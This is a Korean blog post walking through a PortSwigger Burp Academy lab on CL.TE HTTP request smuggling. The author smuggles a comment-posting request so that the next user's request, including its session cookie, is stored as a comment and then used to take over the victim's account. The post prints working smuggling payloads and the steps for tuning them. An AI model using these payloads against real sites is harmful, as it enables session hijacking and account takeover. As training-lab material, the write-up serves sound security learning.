---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to capture other users' requests"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-19 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: PRACTITIONER (보통)

# 취약점 개요 (Capturing other users' requests)
- 만약 어플리케이션이 유저의 데이터를 저장하고 보여주는 기능을 가지고 있고, HTTP요청 스머글링이 가능하다면, (인증 정보를 포함한) 다른 유저를 요청 내용을 저장하는 용도로 악용될 가능성이 있다. 이 요청 내용에는 세션토큰과 같은 중요 정보도 포함된다. 
- 원리는 이전문제 (프론트엔드 서버가 추가한 HTTP 헤더 내용을 노출시키는 것)와 비슷하다. 스머글링한 HTTP요청의 Content-Length 값이 스머글링 요청의 바디값보다 크면, 그 크기만큼 커넥션에서 이어지는 다른 HTTP 요청 자체가, 스머글링 요청의 바디로 취급되는 원리다. 
- 따라서 이어지는 요청의 HTTP 요청자체가 어플리케이션에 저장되게 된다. 이를 공격자가 보고 정보를 훔치는 것이다.

예를 들면 다음과 같은 모양이다. 

- 저장되는 정보를 담는 파라메터(`comment`)를 가장 HTTP요청의 가장 뒤쪽에 배치하는 것이 포인트다. 
- Content-Length 헤더 값이 400이다. 이 요청의 바디의 길이는 144바이트이므로 이어지는 요청의 256바이트 분의 데이터가 comment 파라메터의 값으로 처리된다. 

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 chunked encoding(TE헤더)을 지원하지 않는다. (즉, CL.TE패턴이다.)
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 다른 유저의 요청이 어플리케이션에 저장되도록 한다. 이 유저의 세션쿠키를 얻어내서 해당 세션으로 어플리케이션에 접근하면 된다. 
- 랩은 Victim의 행동을 시뮬레이션하고 있다. 몇 개의 POST요청이 발생할 때마다 victim도 요청을 보낸다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

Notes   
The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
```

# 풀이 
1. 공격 가능 포인트를 찾는다. 유저의 입력값이 저장되는 부분이다. 블로그 포스트에 커멘트를 저장하는 부분이 있으므로 여기를 이용가능할 것 같다. 

![공격 가능 포인트](/images/burp-academy-hrs-9-1.png)

2. 스머글링해본다. 아래와 같은 형태였을 때 성공했다. 

```
POST / HTTP/1.1
Host: 0a4800bc035b26a98132e8760047007f.web-security-academy.net
Cookie: session=52juPoQ8YgvbMKvGyYhVVRbMPSFc1R1n
Content-Length: 319
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a4800bc035b26a98132e8760047007f.web-security-academy.net
Cookie: session=52juPoQ8YgvbMKvGyYhVVRbMPSFc1R1n
Content-Length: 400
Content-Type: application/x-www-form-urlencoded

csrf=61d1u1mxC1E8B2rPrruu6PjQsSrREKdV&postId=6&name=moon&email=moon%40tester.com&website=&comment=
```

![스머글링 성공](/images/burp-academy-hrs-9-2.png)

블로그 글 보기 URL을 리로딩해본다. 그러면 다음과 같이 HTTP요청이 저장된 것을 볼 수 있다. 

![HTTP요청이 저장된 모습](/images/burp-academy-hrs-9-3.png)

3. 현재는 스머글링 요청에 지정한 Content-Length 헤더 값이 400이다. 이 것으로는 필요한 정보를 노출시키기에는 조금 짧으므로 서서히 키우면서 반복해서 테스트해본다. 테스트 하다보면 페이지를 리로딩했을 때 다음과 같이 Invalid Request페이지로 리다이렉트 되는 경우도 있다. 

![Invalid Request페이지로 이동](/images/burp-academy-hrs-9-4.png)

또한 Content-Length 값이 너무 크면 타임아웃이 발생하기도 한다. 

![타임아웃 발생](/images/burp-academy-hrs-9-5.png)

4. 어쨌든 계속 반복한다. Content-Length 값이 900정도 였을 때 몇번 반복테스트해서 다음과 같이 Victim의 세션토큰을 얻어내는데 성공했다. 

![Victim의 세션토큰을 얻어내는데 성공](/images/burp-academy-hrs-9-6.png)

5. 이 세션토큰을 가지고 계정 정보 페이지에 접근하면 문제가 풀렸다는 메세지가 표시된다. 

![풀이 성공](/images/burp-academy-hrs-9-success.png)
